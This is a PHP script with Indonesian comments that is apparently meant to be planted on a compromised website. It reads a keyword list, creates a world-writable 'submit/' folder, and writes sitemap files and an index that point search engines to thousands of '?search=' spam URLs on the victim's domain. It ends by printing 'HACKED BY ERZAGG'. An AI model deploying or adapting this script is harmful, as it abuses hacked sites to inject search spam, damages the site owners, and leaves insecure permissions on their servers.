<?php
function getFileRowCount($filename)
{
    $file = fopen($filename, "r");
    $rowCount = 0;

    while (!feof($file)) {
        fgets($file);
        $rowCount++;
    }

    fclose($file);

    return $rowCount;
}

$protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
$fullUrl = $protocol . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];

if (isset($fullUrl)) {
    $parsedUrl = parse_url($fullUrl);
    $scheme = isset($parsedUrl['scheme']) ? $parsedUrl['scheme'] : '';
    $host = isset($parsedUrl['host']) ? $parsedUrl['host'] : '';
    $path = isset($parsedUrl['path']) ? $parsedUrl['path'] : '';
    $baseUrl = $scheme . "://" . $host . $path;
    $urlAsli = str_replace("x.php", "", $baseUrl);
    
    $judulFile = "kw.txt";
    $jumlahBaris = getFileRowCount($judulFile);
    $maxUrlsPerSitemap = 10000; // Maksimal URL per sitemap
    $outputDirectory = "submit/"; // Direktori output

    // Pastikan direktori output ada
    if (!is_dir($outputDirectory)) {
        mkdir($outputDirectory, 0777, true);
    }

    $fileLines = file($judulFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    $totalUrls = count($fileLines);
    $numSitemaps = ceil($totalUrls / $maxUrlsPerSitemap);

    // Buat sitemap index
    $sitemapIndexFile = fopen($outputDirectory . "query.xml", "w");
    fwrite($sitemapIndexFile, '<?xml version="1.0" encoding="UTF-8"?>' . PHP_EOL);
    fwrite($sitemapIndexFile, '<sitemapindex xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL);

    // Buat file sitemap kecil
    for ($i = 0; $i < $numSitemaps; $i++) {
        $sitemapFileName = "sitemap-" . str_pad(($i + 1), 3, "0", STR_PAD_LEFT) . ".xml";
        $sitemapFilePath = $outputDirectory . $sitemapFileName;

        $sitemapFile = fopen($sitemapFilePath, "w");
        fwrite($sitemapFile, '<?xml version="1.0" encoding="UTF-8"?>' . PHP_EOL);
        fwrite($sitemapFile, '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL);

        $start = $i * $maxUrlsPerSitemap;
        $urlsChunk = array_slice($fileLines, $start, $maxUrlsPerSitemap);

        foreach ($urlsChunk as $judul) {
            $judul = str_replace(' ', '-', $judul);
            $sitemapLink = $urlAsli . '?search=' . urlencode($judul);
            fwrite($sitemapFile, '  <url>' . PHP_EOL);
            fwrite($sitemapFile, '    <loc>' . $sitemapLink . '</loc>' . PHP_EOL);
            fwrite($sitemapFile, '  </url>' . PHP_EOL);
        }

        fwrite($sitemapFile, '</urlset>' . PHP_EOL);
        fclose($sitemapFile);

        // Tambahkan ke sitemap index
        fwrite($sitemapIndexFile, '  <sitemap>' . PHP_EOL);
        fwrite($sitemapIndexFile, '    <loc>' . $urlAsli . 'submit/' . $sitemapFileName . '</loc>' . PHP_EOL);
        fwrite($sitemapIndexFile, '  </sitemap>' . PHP_EOL);
    }

    fwrite($sitemapIndexFile, '</sitemapindex>' . PHP_EOL);
    fclose($sitemapIndexFile);

    echo "GASSS !!! HACKED BY ERZAGG";
} else {
    echo "URL saat ini tidak didefinisikan.";
}
?>
